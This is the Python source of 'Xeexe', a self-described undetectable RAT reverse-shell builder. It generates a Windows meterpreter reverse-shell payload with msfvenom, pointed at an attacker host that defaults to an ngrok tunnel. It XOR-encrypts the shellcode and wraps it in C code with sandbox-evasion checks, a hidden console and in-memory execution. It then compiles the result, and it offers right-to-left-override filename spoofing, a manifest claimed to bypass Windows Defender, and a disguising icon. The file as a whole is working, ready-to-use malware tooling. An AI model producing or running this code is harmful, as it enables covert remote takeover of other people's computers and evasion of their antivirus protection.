#!/usr/bin/env python3 
# -*- coding: utf8 -*-  

# @name   : Xeexe - FUD RAT REVERSE SHELL  
# @url    : https://github.com/persianhydra/Xeexe
# @author : Persian Hydra (Persian_hydra@pm.me) 

#            ---------------------------------------------------
#                         Xeexe by PersianHydra                                                 
#            ---------------------------------------------------
#                               Copyright (C) <2020>  
#
#        This program is free software: you can redistribute it and/or modify
#        it under the terms of the GNU General Public License as published by
#        the Free Software Foundation, either version 3 of the License, or
#        any later version.
#
#        This program is distributed in the hope that it will be useful,
#        but WITHOUT ANY WARRANTY; without even the implied warranty of
#        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
#        GNU General Public License for more details.
#
#        You should have received a copy of the GNU General Public License
#        along with this program.  If not, see <http://www.gnu.org/licenses/>.

import os
import random
import string
import hashlib


class ConsoleManager:

    colour_codes = {
	"GREEN": "\033[1;32m",
	"YELLOW": "\033[1;33m",
	"MAGENTA": "\033[1;35m",
	"CYAN": "\033[1;36m",
	"BLUE": "\033[1;34m",
	"RESET_ALL": "\033[0m",
	"RED": "\033[1;31m",
    }

    _print_base = lambda message, prefix, colour : f"{colour}[{prefix}]{ConsoleManager.colour_codes['RESET_ALL']} {message}"

    @staticmethod
    def start_art():
        print(f'''{ConsoleManager.colour_codes["RED"]}
        XXXXXXX       XXXXXXX                                                                           
        X:::::X       X:::::X                                                                           
        X:::::X       X:::::X                                                                           
        X::::::X     X::::::X                                                                           
        XXX:::::X   X:::::XXX    eeeeeeeeeeee        eeeeeeeeeeee  xxxxxxx      xxxxxxx eeeeeeeeeeee    
            X:::::X X:::::X     ee::::::::::::ee    ee::::::::::::ee x:::::x    x:::::xee::::::::::::ee  
            X:::::X:::::X     e::::::eeeee:::::ee e::::::eeeee:::::eex:::::x  x:::::xe::::::eeeee:::::ee
            X:::::::::X     e::::::e     e:::::ee::::::e     e:::::e x:::::xx:::::xe::::::e     e:::::e
            X:::::::::X     e:::::::eeeee::::::ee:::::::eeeee::::::e  x::::::::::x e:::::::eeeee::::::e
            X:::::X:::::X    e:::::::::::::::::e e:::::::::::::::::e    x::::::::x  e:::::::::::::::::e 
            X:::::X X:::::X   e::::::eeeeeeeeeee  e::::::eeeeeeeeeee     x::::::::x  e::::::eeeeeeeeeee  
        XXX:::::X   X:::::XXXe:::::::e           e:::::::e             x::::::::::x e:::::::e           
        X::::::X     X::::::Xe::::::::e          e::::::::e           x:::::xx:::::xe::::::::e          
        X:::::X       X:::::X e::::::::eeeeeeee   e::::::::eeeeeeee  x:::::x  x:::::xe::::::::eeeeeeee  
        X:::::X       X:::::X  ee:::::::::::::e    ee:::::::::::::e x:::::x    x:::::xee:::::::::::::e  
        XXXXXXX       XXXXXXX    eeeeeeeeeeeeee      eeeeeeeeeeeeeexxxxxxx      xxxxxxx eeeeeeeeeeeeee  
                                                                                                            
        {ConsoleManager.colour_codes['RESET_ALL']}''')

        print(f'''{ConsoleManager.colour_codes["BLUE"]}
            ____                 _                __  __          __          
        / __ \___  __________(_)___ _____     / / / /_  ______/ /________ _
        / /_/ / _ \/ ___/ ___/ / __ `/ __ \   / /_/ / / / / __  / ___/ __ `/
        / ____/  __/ /  (__  ) / /_/ / / / /  / __  / /_/ / /_/ / /  / /_/ / 
        /_/    \___/_/  /____/_/\__,_/_/ /_/  /_/ /_/\__, /\__,_/_/   \__,_/  
                                                    /____/                    
                                                /____/                    

        {ConsoleManager.colour_codes['RESET_ALL']}''')


    @staticmethod
    def print_status(message):
        """Indicate normal program output"""
        return ConsoleManager._print_base(message, "+", ConsoleManager.colour_codes["CYAN"])


    @staticmethod
    def print_query(message):
        """Indicate user input expected"""
        return ConsoleManager._print_base(message, "?", ConsoleManager.colour_codes["YELLOW"])


    @staticmethod
    def print_success(message):
        """Indicate success"""
        return ConsoleManager._print_base(message, "✔", ConsoleManager.colour_codes["GREEN"])


    @staticmethod
    def print_error(message):
        """Indicate failure"""
        return ConsoleManager._print_base(message, "!", ConsoleManager.colour_codes["MAGENTA"]) 

    @staticmethod
    def random_string(length=10):
        # Return 11 character string where the first character is always a letter
        return f"{random.choice(string.ascii_lowercase)}{''.join(random.choices(string.ascii_lowercase + string.digits, k=length))}"

    @staticmethod
    def xor(data_as_bytes, key):
        key_length = len(key)
        key_int = list(map(ord, key))
        return bytes(((data_as_bytes[i] ^ key_int[i % key_length]) for i in range(len(data_as_bytes))))

    @staticmethod
    def writetofile(data, key, output_file):
        shellcode = "\\x"
        shellcode += "\\x".join(format(b, "02x") for b in data)

        names = [ConsoleManager.random_string() for _ in range(10)]

        if shellcode:
            try:
                with open(output_file, "w+") as f:
                    shellcode_lines = []
                    shellcode_lines.append("#include <windows.h>\n#include <stdio.h>\n\n")
                    shellcode_lines.append(f"BOOL {names[8]}() {{\nint Tick = GetTickCount();\nSleep(1000);\nint Tac = GetTickCount();\nif ((Tac - Tick) < 1000) {{\nreturn 0;}}\nelse return 1;\n}}\n\n")
                    shellcode_lines.append(f" int main () {{ \n HWND hWnd = GetConsoleWindow();\nShowWindow(hWnd, SW_HIDE);\nHINSTANCE DLL = LoadLibrary(TEXT(\"{names[2]}.dll\"));\nif (DLL != NULL) {{\nreturn 0;}}\n")
                    shellcode_lines.append(f"if ({names[8]}()) {{char * {names[4]} = NULL;\n{names[4]} = (char *)malloc(100000000);\nif ({names[4]} != NULL) {{\nmemset({names[4]}, 00, 100000000);\nfree({names[4]});\n")
                    shellcode_lines.append(f"\nchar {names[3]}[] = \"{shellcode}\";")
                    shellcode_lines.append(f"\n\nchar {names[7]}[] = \"{key}\";")
                    shellcode_lines.append(f"char {names[5]}[sizeof {names[3]}];\nint j = 0;\nfor (int i = 0; i < sizeof {names[3]}; i++) {{\nif (j == sizeof {names[7]} - 1) j = 0;\n{names[5]}[i] = {names[3]}[i] ^ {names[7]}[j];\nj++;\n}}\n")
                    shellcode_lines.append(f"void *{names[6]} = VirtualAlloc(0, sizeof {names[5]}, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\nmemcpy({names[6]}, {names[5]}, sizeof {names[5]});CreateThread(NULL, 0,{names[6]}, NULL, 0, NULL);\n\nwhile (1) {{\nif (!{names[8]}()) {{ return 0; }}\n}}\n}}\n}}\n}}\n")
                    f.writelines(shellcode_lines)
                print(ConsoleManager.print_success(f"Encrypted Shellcode saved in [{output_file}]"))
            except IOError as e:
                print(ConsoleManager.print_error(f"[!] Could not write C++ code to [{output_file}]"))
                raise SystemExit(e)



class Xeexe:

    def __init__(self):
        pass

    def generate_payload(self):
        os.system(self.raw_payload)
        try:
            shellcode_output = "./result/Xeexe.raw"
            with open(shellcode_output, encoding="utf-8", errors="ignore") as shellcode_output_handle:
                shellcode_bytes = bytearray(shellcode_output_handle.read(), "utf8")
                print(ConsoleManager.print_status(f"Shellcode file [{shellcode_output}] successfully loaded"))
        except IOError as e:
            print(ConsoleManager.print_error(f"Could not open or read file [{shellcode_output}]"))
            raise SystemExit(e)

        print(ConsoleManager.print_status(f"MD5 hash of the initial shellcode: [{hashlib.md5(shellcode_bytes).hexdigest()}]"))
        print(ConsoleManager.print_status(f"Shellcode size: [{len(shellcode_bytes)}] bytes"))

        self.master_key = input(ConsoleManager.print_query("Enter the Key to Encrypt Shellcode with: "))
        print(ConsoleManager.print_success(f"XOR Encrypting the shellcode with key [{self.master_key}]"))
        self.transformed_shellcode = ConsoleManager.xor(shellcode_bytes, self.master_key)

        print(ConsoleManager.print_status(f"Encrypted shellcode size: [{len(self.transformed_shellcode)}] bytes"))
        
        # Writing To File
        print(ConsoleManager.print_status("Generating C code file"))
        self.source_file = f"./result/Xeexe_{self.lport}.c"
        ConsoleManager.writetofile(self.transformed_shellcode, self.master_key, self.source_file)

    def get_info(self):
        self.payload_type = input(ConsoleManager.print_query("What Xeexe payload you need [tcp--https--http--ipv6_tcp]: "))
        # If payload_type==None, default to "tcp"
        self.payload_type = self.payload_type or "tcp"
        print(ConsoleManager.print_success(f"Payload TYPE : {self.payload_type}"))

        self.lhost = input(ConsoleManager.print_query("Enter LHOST for Payload [NGROK support]: "))
        # If lhost==None, default to "0.tcp.ngrok.io"
        self.lhost = self.lhost or "0.tcp.ngrok.io"
        print(ConsoleManager.print_success(f"LHOST for Payload [LPORT] : {self.lhost}"))

        self.lport = None
        while not self.lport:
            self.lport = input(ConsoleManager.print_query("Enter LPORT for Payload [NGROK support]: "))
        print(ConsoleManager.print_success(f"LPORT for Payload : {self.lport}"))

    def rename_exe(self):
        reverse_char = "‮"
        print(ConsoleManager.print_status("If you want to use the LEFT-TO-RIGHT OVERRIDE character use '|' "))
        return (input(ConsoleManager.print_query("Please enter new exe name: ")).replace("|", reverse_char))
        
    def compile(self):
        # Compiling
        self.exe_name = f"./result/Xeexe_{self.lport}"

        print(ConsoleManager.print_success(f"Compiling file [{self.source_file}] with Mingw Compiler "))
        compilation_string = f"x86_64-w64-mingw32-gcc {self.source_file} -o {self.exe_name}.exe"
        os.system(compilation_string)
        print(ConsoleManager.print_success("Compiled Sucessfully"))
        
        print(ConsoleManager.print_status("Renaming File "))
        os.rename(f"{self.exe_name}.exe", f"./result/{self.rename_exe()}")
        print(ConsoleManager.print_success("Done "))

        print(ConsoleManager.print_success("Removing Temp Files"))
        
        try:
            os.remove("./result/Xeexe.raw")
            os.remove(self.source_file)
            os.remove(f"{self.exe_name}.exe")
        except FileNotFoundError:
            pass

        self.manifest = f"wine rcedit.exe --application-manifest template.exe.manifest {self.exe_name}.exe;#1 "

        while generate_manifest := input(ConsoleManager.print_query("Do you want to add Manifest (Generally Bypasses Windows Defender)? (y/n) ")):
            if generate_manifest not in ("y", "n") or not generate_manifest:
                print(ConsoleManager.print_error("Answer must be 'y' or 'n'"))
                continue
            else: break

        self.generate_manifest = generate_manifest
        

    def adjust_payload(self):
        # Display Results
        print(f"\n{'='*36} RESULT {'='*36}\n")

        if self.generate_manifest == "y":
            print(ConsoleManager.print_status("Adding Manifest"))
            os.system(self.manifest)
            print(ConsoleManager.print_success(f"Xeexe File with Manifest [{self.exe_name}.exe]"))
        else:
            print(ConsoleManager.print_success(f"Xeexe File [{self.exe_name}.exe]"))
            
        icon = f"wine rcedit.exe --set-icon icon/icon.ico {self.exe_name}.exe;#1 "

        while generate_icon:= input(ConsoleManager.print_query("Do you want to add Icon ? (y/n) ")).lower().strip():
            if generate_icon not in ("y", "n") or not generate_icon:
                print(ConsoleManager.print_error("Answer must be 'y' or 'n'"))
                continue
            else: break

        # Display Results icon
        print(f"\n{'='*36} RESULT {'='*36}\n")

        if generate_icon == "y":
            print(ConsoleManager.print_status("Adding icon"))
            os.system(icon)
            print(ConsoleManager.print_success(f"Xeexe File with icon in ./result"))
        else:
            print(ConsoleManager.print_success(f"Xeexe File in ./result"))
        print("\n")
        
        print(ConsoleManager.print_status("Persian Hydra\n"))
        print(ConsoleManager.print_success("Happy Hacking Xeexe\n"))

    def setup(self):
        os.system("clear")
        ConsoleManager.start_art()
        print(ConsoleManager.print_status("Checking directories..."))
        print(ConsoleManager.print_status("Creating [./result] directory for resulting code files"))
        os.makedirs("./result", exist_ok=True)

    def run(self):
        self.setup()
        self.get_info()
        self.raw_payload = (f"msfvenom -p windows/x64/meterpreter_reverse_{self.payload_type} LHOST={self.lhost} LPORT={self.lport} EXITFUNC=process --platform windows -a x64 -f raw -o ./result/Xeexe.raw")
        self.generate_payload()
        self.compile()
        self.adjust_payload()


if __name__ == "__main__":
    xee = Xeexe()
    xee.run()
